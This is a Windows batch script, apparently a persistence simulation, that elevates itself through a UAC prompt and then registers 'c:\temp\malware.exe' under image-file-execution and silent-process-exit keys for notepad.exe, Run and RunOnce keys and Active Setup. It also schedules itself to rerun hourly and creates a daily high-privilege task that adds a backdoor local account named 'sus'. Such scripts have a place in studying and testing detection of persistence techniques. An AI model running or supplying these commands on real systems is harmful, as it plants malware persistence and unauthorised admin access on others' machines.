@echo off
:: BatchGotAdmin
::-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
::--------------------------------------
setlocal
copy /Y %~dp0setup.bat "C:\Windows\Temp\setup.bat"

reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 0x200 /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 0x1 /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d c:\temp\malware.exe /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Malware /t REG_SZ /d c:\temp\malware.exe /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Malware /t REG_SZ /d c:\temp\malware.exe /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Malware /t REG_SZ /d c:\temp\malware.exe /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Malware /t REG_SZ /d c:\temp\malware.exe /f
reg add "HKLM\Software\Microsoft\Active Setup\Installed Components\{Malware}" /v StubPath /t REG_SZ /d c:\temp\malware.exe /f

SCHTASKS /CREATE /SC HOURLY /TN "System\Setup" /TR "C:\Windows\Temp\setup.bat" /F
SCHTASKS /CREATE /SC DAILY /TN "System\Nothing" /TR "cmd /C 'net user sus sus /add'" /RL HIGHEST /F

PAUSE
